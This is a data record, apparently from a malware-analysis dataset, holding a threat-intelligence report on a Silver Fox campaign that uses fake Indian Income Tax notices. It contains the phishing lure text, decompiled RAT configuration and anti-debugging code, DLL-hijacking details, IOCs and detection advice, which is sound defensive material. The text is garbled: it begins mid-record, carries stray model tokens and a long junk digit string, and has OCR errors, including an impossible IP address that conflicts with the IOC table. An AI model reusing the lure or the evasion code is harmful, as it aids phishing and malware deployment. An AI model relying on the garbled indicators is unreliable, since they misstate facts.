High (anti-analysis, in-memory execution, living-off-the-land abuse) \n\n## VICTIM \n\n### Target Profile \n\nIndian enterprises and users \n\nFrance, tax, and business-relevant personas \n\n### Exposures \n\nUser-level compromise escalating to persistent RAT control \n\nLong dwell time risk due to stealthy registry persistence \n\n### Operational Risk \n\nSilent surveillance \n\nCredential theft \n\nSelective deployment of high-risk modules only when needed \n\n## Silver Fox APT - IncomeTax Campaign \n\n### CAPABILITY \n\n### Initial Access \n\nPhishing with government-themed PDF lure \n\n### Execution & Loader Chain \n\nNESS installer \n\nSigned binary DLL hijacking \n\nProcess hooking into explorer.exe \n\nDonut-generated in-memory loader \n\n### Stage 4: Valley RAT Core \n\nTwo-stage configuration system (embedded + registry override) \n\n22-parameter operational config \n\nMulti-tier CI loop with protocol switching \n\n### Post-Compromise Capabilities \n\nKeylogging (M) \n\nInteractive shell (sh) \n\nFile download / upload (df) \n\nFull backdoor mode (xd) \n\n### Modular Expansion \n\nPlugin delivery via CI \n\nIn-memory execution + registry persistence \n\nPlugin integrity checks and execution guards \n\n## INFRASTRUCTURE \n\nInitial Redirect / Decoy Hosting \n\ngop@.ix \n\nIP: 45.207.231.94 \n\nCommand & Control \n\nN: [yuxuanow].top \n\nIP: 103.20.199.2147 \n\nPlotted Infrastructure (Shared Favorites / Patrolled Domains) \n\nlald.club = 45.207.231.107 \n\ngov=work, gov=a.fh, gov=a.club, gov=c.club, gov.club, gov=b.club = 160.124.3.103 \n\nxqghw.com = 8.217.9.165 \n\ndngtaki.cn = 47.239.225.43 \n\nhiko.cn, kiyoi.club, hhmm.wark = 43.100.22.158 \n\nsec2020gb.cn, 2025wmm.cn = 43.100.123.207 \n\nhiko.wark = 43.100.63.145 \n\n### ASN reuse over time: AS112839, AS149801 \n\n### Design Characteristics \n\nThree-tier failover with retry thresholds (200 failures) \n\nMixed protocol support (HTTPs) + two TCPs \n\nRegistry-driven dynamic CI updates \n\nResilience Features<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\n## Impact  \n\nHigh risk of long- term undetected compromise: Registry- resident plugins and delayed beaconing allow the RAT to survive reboots while remaining low- noise. Dynamic threat evolution post- infection: Attackers can upgrade capabilities (keylogging, credential theft, lateral movement) without taking initial access again or malware redeployment. Infrastructure- based blocking is brittle: Tiered C2 failover and protocol switching reduce the effectiveness of static IP/domain blocking. Reduced visibility for incident response: In- memory execution combined with registry- based persistence complicates timeline reconstruction and malware eradication. Elevated data security risk: On- demand module delivery enables targeted credential harvesting and surveillance tailored to victim role and value.  \n\n## Recommendations  \n\nMonitor registry abuse as a persistence layer: Alert on executable REG_BINARY blobs and anomalous values under non- standard paths such as HKCU\\Console\\*, especially those written by user processes. Detect multi- tier C2 logic, not just domains: Build detections for retry- heavy outbound connections, protocol switching (HTTP \\(\\leftrightarrow\\) raw TCP), delayed first beacon, and repeated failures followed by fallback behavior. Instrument memory- permission anomalies: Alert on processes allocating PAGE_EXECUTE_READWRITE memory followed by thread creation, particularly inside explorer.exe. Hunt for signed binary + local DLL load patterns: Correlate execution of signed binaries from temp directories with unsigned DLL loads and immediate child thread creation. Treat RAT feature enablement as an alerting signal: Monitor sudden activation of keylogging APIs, interactive shell behavior, or file transfer operations within long- running, previously quiet processes.  \n\n## Appendix  \n\n## IOCs  \n\n<table><tr><td>Indicator Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Sha256 Hash</td><td>77ea62ff74a66f61a511eb6b6edac20be9822fa9cc1e7354a8cd6379c7b9d2d2</td><td>Stage 1</td></tr><tr><td>Sha256 Hash</td><td>fa388a6cdd28ad5dd83acd674483828251f21cbefaa801e839ba39af24a6ac19</td><td>Stage 2</td></tr><tr><td>Sha256 Hash</td><td>f74017b406e993bea5212615febe23198b09ecd73ab79411a9f6571ba1f94cfa</td><td>Stage 3</td></tr><tr><td>Sha256 Hash</td><td>068e49e734c2c7be4fb3f01a40bb8beb2d5f4677872fabbed7741245a7ea97c</td><td>Stage 4</td></tr><tr><td>Domain</td><td>ggwk[.]cc</td><td>Embedded<br>Domain Within<br>Decoy Attachment</td></tr></table>\n\n<--- Page Split --->\n\n\n<table><tr><td>Indicator<br>Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Domain</td><td>b[.]yuxuanow[.]top</td><td>Shellcode C2</td></tr><tr><td>IP</td><td>45.207.231[.]94</td><td>Resolution from<br>ggwk[.]cc</td></tr><tr><td>IP</td><td>103.20.195[.]147</td><td>Resolution from<br>b[.]yuxuanow[.]top</td></tr></table>", "format_code": "sub_405D70(\"L\\\"dd:\\\",\",word_41CEF0,0);sub_405D70(\"L\\\"cl:\\\",\",word_41CF2C,0);sub_405D70(\"L\\\"bb:\\\",\",&word_41CF4,0);sub_405D70(\"L\\\"bb:\\\",\",&word_41CFF4,0);sub_405D70(\"L\\\"jp:\\\",\",0,(int)&unk_41D058);sub_405D70(\"L\\\"sx:\\\",\",0,(int)&unk_41D05C);sub_405D70(\"L\\\"bh:\\\",\",0,(int)&unk_41D060);sub_405D70(\"L\\\"ll:\\\",\",0,(int)&unk_41D064);sub_405D70(\"L\\\"dl:\\\",\",0,(int)&unk_41D06C);sub_405D70(\"L\\\"bd:\\\",\",0,(int)&unk_41D074);", "hash": "hash"}
{"file_name": "fed9c11a-b86a-49a9-a9e2-24332f01a81c.md", "title": "Silver Fox Targeting India Using Tax Themed Phishing Lures", "malicious_code": "sub_405D70(L\"p1:\", Source, 0);\nsub_405D70(L\"o1:\", Source_2, 0);\nsub_405D70(L\"t1:\", 0, &dword_41CA30);\nsub_405D70(L\"p2:\", Source_0, 0);\nsub_405D70(L\"o2:\", Source_1, 0);\nsub_405D70(L\"t2:\", 0, &dword_41CC70);\nsub_405D70(L\"p3:\", Source_3, 0);\nsub_405D70(L\"o3:\", Source_4, 0);\nsub_405D70(L\"t3:\", 0, &dword_41CEB0);", "describe": "cloudsek.com/blog/silver- fox- targeting- india- using- tax- themed- phishing- lures  \n\nPrajwal Awasthi  \n\nTable of Content  \n\nSubscribe to CloudSEK Resources  \n\nGet the latest industry news, threats and resources.  \n\n## Executive Summary  \n\nCloudSEK's TRIAD discovered a campaign by Silver Fox APT targeting India with Income tax themed phishing lures. The lure is visually identical to the ones discovered by other vendors, however, this campaign has not been attributed to a specific threat actor before this report. Attribution accuracy is critical to threat intelligence; it enables defenders to predict adversary behavior and deploy targeted countermeasures. Misattribution from trusted sources propagates through threat feeds and detection systems, causing organizations to focus on the wrong threat while the actual adversary operates undetected. Attributing this campaign to SideWinder APT (India- aligned) contradicts basic victimology and creates systemic confusion. Using our report aims to highlight the sophisticated kill chain by the Chinese APT group, and explains the rationale behind CloudSEK's attribution.  \n\n## Kill Chain  \n\n<｜end▁of▁sentence｜>\n  \n\n## Initial Access Vector  \n\nTOPSOE INDIA PRIVATE LIMITED \n\n \n\nस्वरोचन ने अधिकार - Allgate/1/6/6/6/6/6/6/6/6/6/6/1/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/\n  \n\nMalicious email  \n\nWe found an interesting email uploaded from India with just an attachment called \"TOPsoE India Private Limited\". The pdf looked like an official Income Tax Department document. Upon clicking on the pdf, \"ggwk[.]cc\" opens up on the browser and a zip file called \"tax affairs.exe\" is downloaded.\n\n<--- Page Split --->\n\nNo. TAX/PEN/2025-142 \n\nभारत सरकार / Government of India\nवित्त मंत्रालय / Ministry of Finance\nआयकर विभाग / Income Tax Department\nप्रवर्तन प्रभाग / Enforcement Division \n\nAayakar Bhavan,\nNew Delhi - 110001 \n\nOFFICE MEMORANDUM \n\nSub: कर अनुपालन की कमी और दंड सूचना / Tax Compliance Deficiency and Penalty Notice \n\n1. आपकी कमनी की कर निरीक्षण के दौरान आयकर अधिनियम, 1961 की धारा 271(1)(c) के तहत कर संबंधी अनियमिताएं पाई गई हैं। The tax inspection of your company has revealed irregularities under Section 271(1)(c) of the Income Tax Act, 1961. \n\n2. इस सूचना की प्राप्ति के 72 घंटे (3 दिन) के भीतर निम्नलिखित दस्तावेज आयकर विभाग को प्रस्तुत करना अनिवार्य है। It is mandatory to submit the following documents to the Income Tax Department within 72 hours (3 days) of receipt of this notice. \n\nआवश्यक दस्तावेज सूची / Required Documents List\nनीचे दिए गए लिंक से दस्तावेज डाउनलोड करें / Download documents from the link below \n\nदस्तावेज डाउनलोड करें / Download Documents \n\n3. निर्धारित समयावधि में दस्तावेज प्रस्तुत न करने पर आयकर अधिनियम की धारा 276C के तहत कानूनी कार्रवाई की जाएगी। Legal action will be taken under Section 276C of the Income Tax Act if documents are not submitted within the stipulated time. \n\n(राज कुमार शर्मा) \n\nRaj Kumar Sharma \n\nसहायक आयकर आयुक्त \n\nAssistant Commissioner of Income Tax \n\nTechnical Analysis \n\nStage - 1: Tax Affairs.zip \n\nPE32 \n\nOperation system: Windows(2000)[1386, 32-bit, GUI] \n\nLinker: Microsoft Linker(10.00.40219) \n\nCompiler: Microsoft Visual C/C++(16.00.40219)[C] \n\nLanguage: C \n\nTool: Visual Studio(2010) \n\n(Heur) Packer: Compressed or packed data[Strange overlay] \n\nInstaller: Nullsoft Scriptable Install System(2.46.5-ANSI) \n\nOverlay: Binary[Offset=0x00034c00,Size=0x002a2e40] \n\nUnknown: Unknown \n\nDetect It Easy \n\nUsing static analysis we see that the given PE file is a 32 bit GUI binary. More importantly, the file is identified as a Nullsoft Scriptable Install system (NSIS) installer. NSIS installers embed their installation script, compressed payloads etc inside the binary itself and we can move ahead to analyse it as an installer driven staging payload.\n\n<--- Page Split --->\nGetTempPathA(0x10000u, PathName); \n\nif ( sub_4032CB() || (GetWindowsDirectoryA(PathName, 0xFFBu), lstrcatA(PathName, \"\\Temp\"), sub_4032CB()) \n\nDeleteFileA(FileName); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = (const char *)sub_403030(Buffer); \n\nif (!Error_writing_temporary_file._Make_sure_your_temp_folder_is_val ) \n\nif (!dword_433C24 ) \n\n{ \n\nABEL_34: \n\nuExitCode = -1; \n\nuExitCode = sub_4052E6(); \n\ngoto LABEL_35; \n\n} \n\nfor ( i = (CHAR *)sub_40567B(&sz, 0); i >= &sz && sub_4032FF(i, \"_=\", 4); --i ) \n\n; \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = \"Error launching installer\"; \n\nif ( i >= &sz ) \n\n{ \n\n* i = 0; \n\nlpString2_3 = i + 4; \n\nif ( !sub_405EFC(lpString2_3) ) \n\ngoto LABEL_35; \n\nlstrcpyAn_wrp(&lpString1_, lpString2_3); \n\nlstrcpyAn_wrp(Directory, lpString2_3); \n\nError_writing_temporary_file._Make_sure_your_temp_folder_is_val = 0; \n\ngoto LABEL_34; \n\n} \n\nlstrcatA(PathName, \"\\nsu.tmp\"); \n\nif ( lstrcmpiA(PathName, ::lpString2) ) \n\n{ \n\nCreateDirectoryA(PathName, 0); \n\nSetCurrentDirectoryA(PathName); \n\nif ( !lpString1_ ) \n\nlstrcpyAn_wrp(&lpString1_, ::lpString2); \n\nlstrcpyAn_wrp(lpString1_, lpString2); \n\nlstrcpyAn_wrp(&lpString1_0, \"A\"); \n\nn26 = 26;<｜end▁of▁sentence｜>\n\n<center>NSIS Installer </center>  \n\nThe NSIS installer begins by resolving a writable temporary directory using GetTempPathA. If the operation fails, it falls back to C:\\Windows\\Temp, ensuring execution reliability. Once a valid location is identified, the installer creates an NSIS specific working directory (\\~nsu.tmp) and switches the directory to it.  \n\nDropped Files   \n\n<table><tr><td>ndoe &amp;gt; AppData &amp;gt; Local &amp;gt; Temp</td><td></td><td></td><td></td></tr><tr><td>Name</td><td>Date modified</td><td>Type</td><td>Size</td></tr><tr><td>Thunder.exe</td><td>7/24/2024 10:42 PM</td><td>Application</td><td>635 KB</td></tr><tr><td>FastAnimation.dll</td><td>5/27/2025 4:38 AM</td><td>Application extens...</td><td>578 KB</td></tr><tr><td>leakrepair.dll</td><td>5/27/2025 4:40 AM</td><td>Application extens...</td><td>716 KB</td></tr><tr><td>dynlbase.dll</td><td>5/27/2025 4:48 AM</td><td>Application extens...</td><td>1,431 KB</td></tr><tr><td>libaw.dat</td><td>5/27/2025 4:59 AM</td><td>DAT File</td><td>1,121 KB</td></tr><tr><td>DumpUper.ini</td><td>5/27/2025 5:01 AM</td><td>Configuration setti...</td><td>2 KB</td></tr><tr><td>libdefa.dat</td><td>9/16/2025 7:38 AM</td><td>DAT File</td><td>321 KB</td></tr><tr><td>box.ini</td><td>9/25/2025 8:00 PM</td><td>Configuration setti...</td><td>126 KB</td></tr><tr><td>libexpat.dll</td><td>9/25/2025 8:13 PM</td><td>Application extens...</td><td>32 KB</td></tr></table>  \n\nUpon analysis we found that only 2 files are of use to us, Thunder.exe and libexpat.dll. Thunder.exe is a legitimate, digitally signed executable developed by Xunlei (迅雷), commonly distributed as part of the Thunder download manager ecosystem. In this infection chain, the binary itself is not malicious but is abused as a DLL hijacking host. When executed from installer's temporary directory, Thunder.exe loads libexpat.dll from its local path due to default DLL search order. We can confirm this in x64dbg.\n\n<--- Page Split --->\npos: 0%\n\npush eax\n\njmp tax affairs.402008\n\npush F\n\ncall tax affairs.405A65\n\npush 64\n\npush dword ptr ss:[ebp+8]\n\ncall esi\n\ncmp eax,102\n\nje tax affairs.401FFC\n\nlea eax,dword ptr ss:[ebp-8]\n\npush eax\n\npush dword ptr ss:[ebp+8]\n\ncall dword ptr ds:[<GetExitCodeProcess>]\n\ncmp dword ptr ss:[ebp-20],ebx\n\njl tax affairs.40202E\n\npush dword ptr ss:[ebp-8]\n\npush edi\n\ncall tax affairs.40589E\n\njmp tax affairs.40203A\n\ncmp dword ptr ss:[ebp-8],ebx\n\nje tax affairs.40203A\n\nmov dword ptr ss:[ebp-4],1\n\npush dword ptr ss:[ebp+8]<｜end▁of▁sentence｜>\n\n<center>DLL Loading </center>  \n\n## Stage - 2 : libexpat.dll  \n\nThe dropped libexpat.dll does not export any meaningful functions and is never explicitly invoked by Thunder.exe.The dll relies on the windows loader functionality and calls the DLLMain. This callback is invoked unconditionally, regardless of whether the DLL exports any functions or is actively used by the host process.  \n\nLet's take a look at the working of the DLL.  \n\nv4 = IsDebuggerPresent(); \n\nv5 = &unk_100056DC; \n\nif (!v4) \n\nv5 = &unk_100056E4; \n\nLogStatus((char *)&Format_1, v5); \n\nif (v4) \n\n{ \n\nLogStatus((char *)&Format_2); \n\nreturn 0; \n\n} \n\nelse if (CheckSystemResources()) \n\nGetSystemInfo(&SystemInfo); \n\ndwNumberOfProcessors = SystemInfo.dwNumberOfProcessors; \n\nv7 = &unk_1000560C; \n\nif ( SystemInfo.dwNumberOfProcessors < 4 ) \n\nv7 = &unk_10005614; \n\nLogStatus(aCpu, SystemInfo.dwNumberOfProcessors, v7); \n\nif ( dwNumberOfProcessors >= 4 ) \n\n{ \n\nif (!(unsigned __int8)Persistence()) \n\nLogStatus((char *)&Format_3); \n\nToolHelp32Snapshot = CreateToolhelp32Snapshot(2u, 0); \n\nif ( ToolHelp32Snapshot != (HANDLE)-1 ) \n\n{ \n\npe.dwSize = 556; \n\nif ( Process32Firstw(Toolhelp32Snapshot, &pe) ) \n\n{ \n\ndo \n\n{ \n\nv9 = wcscmp(pe.szExeFile, L\"ida.exe\"); \n\nif ( v9 ) \n\nv9 = v9 < 0 ? -1 : 1; \n\nif (!v9 ) \n\nLogStatus((char *)&Format_4, pe.th32ProcessID); \n\nv10 = wcscmp(pe.szExeFile, L\"x64dbg.exe\"); \n\nif ( v10 ) \n\nv10 = v10 < 0 ? -1 : 1; \n\nif (!v10 ) \n\nLogStatus((char 